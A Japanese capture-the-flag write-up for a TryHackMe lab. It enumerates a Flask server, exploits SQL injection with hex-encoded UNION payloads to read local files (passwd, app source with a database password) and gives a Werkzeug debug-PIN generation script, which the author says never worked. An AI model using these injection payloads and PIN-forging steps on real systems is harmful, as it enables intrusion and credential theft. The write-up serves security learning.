# The Bandit Surfer CTF

https://tryhackme.com/room/surfingyetiiscomingtotown

3番目のフラグを入力するには、https://tryhackme.com/room/adventofcyber23sidequest を訪れるようにという注意書きあり。

## Enumeration

```shell
TARGET=10.145.183.190
sudo bash -c "echo $TARGET   surf.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 64
8000/tcp open  http-alt syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,8000 $TARGET

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt Werkzeug/3.0.0 Python/3.8.10
```

SSH, HTTP

```sh
root@ip-10-146-104-97:~# nikto -p 8000 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.180.143
+ Target Hostname:    surf.thm
+ Target Port:        8000
+ Start Time:         2026-04-28 03:46:01 (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.0 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, OPTIONS 
+ OSVDB-3092: /console: This might be interesting...
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-04-28 03:46:06 (GMT1) (5 seconds)
---------------------------------------------------------------------------
```

### ディレクトリ列挙

```sh
dirb http://$TARGET:8000/

---- Scanning URL: http://10.146.180.143:8000/ ----
+ http://10.146.180.143:8000/console (CODE:200|SIZE:1563)                                                                          
+ http://10.146.180.143:8000/download (CODE:200|SIZE:20)
```

/downaload は、トップページから下記の形式で使用されている。

http://surf.thm:8000/download?id=1

不正なIDを送信すると例外のコールスタックが表示され、下記のパスが見えた。

```
/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py
```

## /donwload

idパラメータでファジングをかけたところ、4だけサイズが2桁大きくて不自然。

```sh
root@ip-10-145-67-153:~# ffuf -u http://surf.thm:8000/download?id=FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 500

1                       [Status: 200, Size: 33017, Words: 2560, Lines: 223]
2                       [Status: 200, Size: 71551, Words: 3093, Lines: 301]
3                       [Status: 200, Size: 69873, Words: 8965, Lines: 596]
4                       [Status: 200, Size: 2305908, Words: 9820, Lines: 8254]
:: Progress: [4655/4655] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

file, exiftool, strings, binwalk を実行したが、何も出なかった。

拡張子はどちらもsvgだが、4 は実体がPNG。

```sh
$ file 1.svg       
1.svg: SVG Scalable Vector Graphics image

$ file 4.svg
4.svg: PNG image data, 1024 x 1024, 8-bit/color RGBA, non-interlaced
```

`http://surf.thm:8000/download?id=5' or 1=1-- -` とリクエストすると、1 と同じ画像がダウンロードされたので、SQLインジェクションの脆弱性は存在する。

sqlmapを実行したところ、脆弱性があることは検知できていたが、シェル取得には至らなかった。（サポートしているのが ASP、ASPX、JSP、PHP のみなので当然だった）

```sh
$ sqlmap -r ./request.txt --os-shell --batch
```

しかし、情報を抜くことはできた。

```sh
available databases [3]:                                                                                          
[*] elfimages
[*] information_schema
[*] performance_schema
```

この1テーブルしかなかった。内部的に id を HTTP のURLに変換していることが分かった。

```sh
Database: elfimages
Table: elves
[4 entries]
+----+--------+------------------------------------------------+
| id | url_id | url                                            |
+----+--------+------------------------------------------------+
| 1  | 1      | http://127.0.0.1:8000/static/imgs/mcblue1.svg  |
| 2  | 2      | http://127.0.0.1:8000/static/imgs/mcblue2.svg  |
| 3  | 3      | http://127.0.0.1:8000/static/imgs/mcblue3.svg  |
| 4  | 4      | http://127.0.0.1:8000/static/imgs/suspects.png |
+----+--------+------------------------------------------------+
```

url を 'file:///etc/passwd' のように更新できれば読めるかと考えたが、UPDATEは無理と思われる。

それよりも UNION SELECT でそういう値が返るようにできれば良いかもしれないと考えた。

連続するハイフンを一つにまとめるようなフィルターが入っている。

```sh
$ curl "http://surf.thm:8000/download?id=5%20UNION%20SELECT%201,2,%27http://localhost:8000/%27--%20-"

MySQLdb.ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'http://localhost:8000/'- -'' at line 1")
```

シャープも削除される。

```sh
$ curl "http://surf.thm:8000/download?id=5%20UNION%20SELECT%201,2,%27http://localhost:8000/%27####"

MySQLdb.ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'http://localhost:8000/''' at line 1")
```

sqlmapのこのペイロードを参考にする。

```
id=5' UNION ALL SELECT CONCAT(0x7176717671,0x766c70584554566d4d74446e494c4c47534a62697261667976475078486e5054635765754e467855,0x7176627171)#
```

成功！ file:///etc/passwd

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f6574632f706173737764%23" 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
mcskidy:x:1000:1000::/home/mcskidy:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

file:///home/mcskidy/app/app.py

```python
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f686f6d652f6d63736b6964792f6170702f6170702e7079%23"
import os
import pycurl
from io import BytesIO
from flask_mysqldb import MySQL
import MySQLdb.cursors
from flask import Flask, send_from_directory, render_template, request, redirect, url_for, Response

app = Flask(__name__, static_url_path='/static')

# MySQL configuration
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'mcskidy'
app.config['MYSQL_PASSWORD'] = 'fSXT8582GcMLmSt6'
app.config['MYSQL_DB'] = 'elfimages'
mysql = MySQL(app)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/download")
def download():
    file_id = request.args.get('id','')

    if file_id!='':
        cur = mysql.connection.cursor()
        query = "SELECT url FROM elves where url_id = '%s'" % (file_id)
        cur.execute(query)
        results = cur.fetchall()
        for url in results:
            filename = url[0]

            response_buf = BytesIO()
            crl = pycurl.Curl()
            crl.setopt(crl.URL, filename)
            crl.setopt(crl.WRITEDATA, response_buf)
            crl.perform()
            crl.close()
            file_data = response_buf.getvalue()

            resp = Response(file_data)
            resp.headers['Content-Type'] = 'image/svg+xml'
            resp.headers['Content-Disposition'] = 'attachment'
            return resp
    else:
        return 'No file selected... '

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000, debug=True)
```

LFIが成功し、/console でPINコードの入力を受け付けているので、PINコード生成からRCEが成立するはず。

## PINコード生成

- /proc/net/dev
- /sys/class/net/eth0/address
- /etc/machine-id
- /proc/self/cgroup
- /proc/sys/kernel/random/boot_id

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f70726f632f6e65742f646576%23"
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo:   53350     598    0    0    0     0          0         0    53350     598    0    0    0     0       0          0
  eth0: 15886001    4384    0    0    0     0          0         0   584110    2823    0    0    0     0       0          0
```

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f7379732f636c6173732f6e65742f657468302f61646472657373%23"
0a:35:52:08:ee:0d
```

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f6574632f6d616368696e652d6964%23"
aee6189caee449718070b58132f2e4ba
```

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f70726f632f73656c662f6367726f7570%23"
13:misc:/
12:cpuset:/
11:cpu,cpuacct:/
10:freezer:/
9:perf_event:/
8:devices:/system.slice/cron.service
7:pids:/system.slice/cron.service
6:hugetlb:/
5:rdma:/
4:net_cls,net_prio:/
3:memory:/system.slice/cron.service
2:blkio:/
1:name=systemd:/system.slice/cron.service
0::/system.slice/cron.service
```

```sh
$ curl "http://surf.thm:8000/download?id=5'%20UNION%20ALL%20SELECT%200x66696c653a2f2f2f70726f632f7379732f6b65726e656c2f72616e646f6d2f626f6f745f6964%23"
0cd1a782-b42a-4464-a13a-4def942f728c
```

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    # str(int('02:42:ac:14:00:02'.replace(':', ''), 16)),  # MAC -> 2485377892354
    '11224125861389',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

・・・何度やっても合わない。

Discordで同様の問題を報告している人が複数いたが例によって黙殺されている。解消する見込みのない進行不能バグと判断して断念。

- 2024/01/15
- 2025/08/22

ちなみに、この後は git の履歴をみるのと、シェルスクリプトの `if []` をPATHインジェクションで置き換えるパターンの攻撃があった模様。gitは自力でできたと思うが、`[` というファイルを作る方法は知らなかったので勉強になった。
